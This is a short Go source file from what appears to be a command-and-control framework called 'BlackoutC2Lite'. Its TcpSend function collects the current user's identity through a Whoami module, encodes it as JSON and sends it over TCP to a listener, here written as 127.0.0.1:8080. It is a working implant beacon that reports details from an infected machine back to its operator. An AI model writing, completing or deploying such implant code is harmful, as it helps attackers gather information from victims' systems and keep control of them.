package tcp

import (
	"BlackoutC2Lite/Modules/Execution/Whoami"
	"encoding/json"
	"fmt"
	"net"
	"time"
)



func TcpSend() error {
	userStruct := Whoami.Whoami()

	conn, err := net.DialTimeout("tcp", "127.0.0.1:8080", 3*time.Second)
	if err != nil {
		return fmt.Errorf("connection error: %w", err)
	}
	defer conn.Close()

	jsonData, err := json.Marshal(userStruct)
	if err != nil {
		return fmt.Errorf("marshal  error: %w", err)
	}

	jsonData = append(jsonData, '\n')

	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
	_, err = conn.Write(jsonData)
	if err != nil {
		return fmt.Errorf("tcp sending error: %w", err)
	}

	fmt.Println("data sending is competed")
	return nil
}